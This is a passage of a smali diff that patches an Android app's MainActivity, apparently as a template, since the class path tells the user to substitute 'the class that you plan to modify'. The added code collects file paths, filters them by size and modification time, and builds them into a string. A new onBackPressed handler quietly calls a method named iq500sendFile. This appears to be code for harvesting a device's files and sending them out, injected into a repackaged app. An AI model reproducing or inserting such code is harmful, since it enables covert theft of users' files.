+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->length()J
+
+    move-result-wide v38
+
+    const/16 v40, 0x400
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    div-long v38, v38, v40
+
+    const/16 v40, 0x400
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    div-long v38, v38, v40
+
+    const/16 v40, 0x5
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    cmp-long v38, v38, v40
+
+    if-lez v38, :cond_545
+
+    const/16 v38, 0x0
+
+    :goto_4aa
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v27, v38
+
+    .line 144
+    move-object/from16 v38, v26
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-nez v38, :cond_541
+
+    move-object/from16 v38, v27
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_541
+
+    .line 146
+    new-instance v38, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v39, v24
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    new-instance v39, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v39
+
+    move-object/from16 v39, v46
+
+    move-object/from16 v40, v46
+
+    invoke-direct/range {v40 .. v40}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v40, v17
+
+    invoke-virtual/range {v39 .. v40}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v39
+
+    move-object/from16 v40, v22
+
+    move/from16 v41, v25
+
+    aget-object v40, v40, v41
+
+    invoke-virtual/range {v39 .. v40}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v39
+
+    invoke-virtual/range {v39 .. v39}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v39
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v38
+
+    move-object/from16 v24, v38
+
+    .line 148
+    move/from16 v38, v25
+
+    move-object/from16 v39, v22
+
+    move-object/from16 v0, v39
+
+    array-length v0, v0
+
+    move/from16 v39, v0
+
+    const/16 v40, 0x1
+
+    add-int/lit8 v39, v39, -0x1
+
+    move/from16 v0, v38
+
+    move/from16 v1, v39
+
+    if-ge v0, v1, :cond_541
+
+    .line 149
+    new-instance v38, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v39, v24
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    const-string v39, "///n"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v38
+
+    move-object/from16 v24, v38
+
+    .line 139
+    :cond_541
+    add-int/lit8 v25, v25, 0x1
+
+    goto/16 :goto_17e
+
+    .line 142
+    :cond_545
+    const/16 v38, 0x1
+
+    goto/16 :goto_4aa
+
+    .line 162
+    :cond_549
+    move-wide/from16 v38, v29
+
+    move-wide/from16 v34, v38
+
+    .line 163
+    move-wide/from16 v38, v29
+
+    new-instance v40, Ljava/io/File;
+
+    move-object/from16 v46, v40
+
+    move-object/from16 v40, v46
+
+    move-object/from16 v41, v46
+
+    move-object/from16 v42, v25
+
+    move/from16 v43, v33
+
+    aget-object v42, v42, v43
+
+    invoke-direct/range {v41 .. v42}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v40 .. v40}, Ljava/io/File;->lastModified()J
+
+    move-result-wide v40
+
+    invoke-static/range {v38 .. v41}, Ljava/lang/Math;->max(JJ)J
+
+    move-result-wide v38
+
+    move-wide/from16 v29, v38
+
+    .line 164
+    move-wide/from16 v38, v34
+
+    move-wide/from16 v40, v29
+
+    cmp-long v38, v38, v40
+
+    if-eqz v38, :cond_57a
+
+    .line 165
+    move-object/from16 v38, v25
+
+    move/from16 v39, v33
+
+    aget-object v38, v38, v39
+
+    move-object/from16 v27, v38
+
+    .line 160
+    :cond_57a
+    add-int/lit8 v33, v33, 0x1
+
+    goto/16 :goto_1bf
+
+    .line 170
+    :cond_57e
+    move-wide/from16 v38, v31
+
+    move-wide/from16 v34, v38
+
+    .line 171
+    move-wide/from16 v38, v31
+
+    new-instance v40, Ljava/io/File;
+
+    move-object/from16 v46, v40
+
+    move-object/from16 v40, v46
+
+    move-object/from16 v41, v46
+
+    move-object/from16 v42, v26
+
+    move/from16 v43, v33
+
+    aget-object v42, v42, v43
+
+    invoke-direct/range {v41 .. v42}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v40 .. v40}, Ljava/io/File;->lastModified()J
+
+    move-result-wide v40
+
+    invoke-static/range {v38 .. v41}, Ljava/lang/Math;->max(JJ)J
+
+    move-result-wide v38
+
+    move-wide/from16 v31, v38
+
+    .line 172
+    move-wide/from16 v38, v34
+
+    move-wide/from16 v40, v31
+
+    cmp-long v38, v38, v40
+
+    if-eqz v38, :cond_5af
+
+    .line 173
+    move-object/from16 v38, v26
+
+    move/from16 v39, v33
+
+    aget-object v38, v38, v39
+    :try_end_5ad
+    .catch Ljava/lang/Exception; {:try_start_e4 .. :try_end_5ad} :catch_5b3
+
+    move-object/from16 v28, v38
+
+    .line 168
+    :cond_5af
+    add-int/lit8 v33, v33, 0x1
+
+    goto/16 :goto_1d2
+
+    .line 211
+    :catch_5b3
+    move-exception v38
+
+    move-object/from16 v14, v38
+
+    .line 217
+    move-object/from16 v38, v14
+
+    :try_start_5b8
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 218
+    const-string v38, "iq500"
+
+    move-object/from16 v39, v14
+
+    invoke-virtual/range {v39 .. v39}, Ljava/lang/Exception;->toString()Ljava/lang/String;
+
+    move-result-object v39
+
+    invoke-static/range {v38 .. v39}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_5c6
+    .catch Ljava/lang/Exception; {:try_start_5b8 .. :try_end_5c6} :catch_5c9
+
+    move-result v38
+
+    goto/16 :goto_2b3
+
+    :catch_5c9
+    move-exception v38
+
+    move-object/from16 v4, v38
+
+    .line 222
+    move-object/from16 v38, v4
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 223
+    const-string v38, "iq500"
+
+    move-object/from16 v39, v4
+
+    invoke-virtual/range {v39 .. v39}, Ljava/lang/Exception;->toString()Ljava/lang/String;
+
+    move-result-object v39
+
+    invoke-static/range {v38 .. v39}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+
+    move-result v38
+
+    goto/16 :goto_2b3
 .end method
 
+
+# virtual methods
+.method public onBackPressed()V
+    .registers 4
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "()V"
+        }
+    .end annotation
+
+    .prologue
+    .line 53
+    move-object v0, p0
+
+    move-object v2, v0
+
+    invoke-direct {v2}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->iq500sendFile()V
+
+    return-void
+.end method
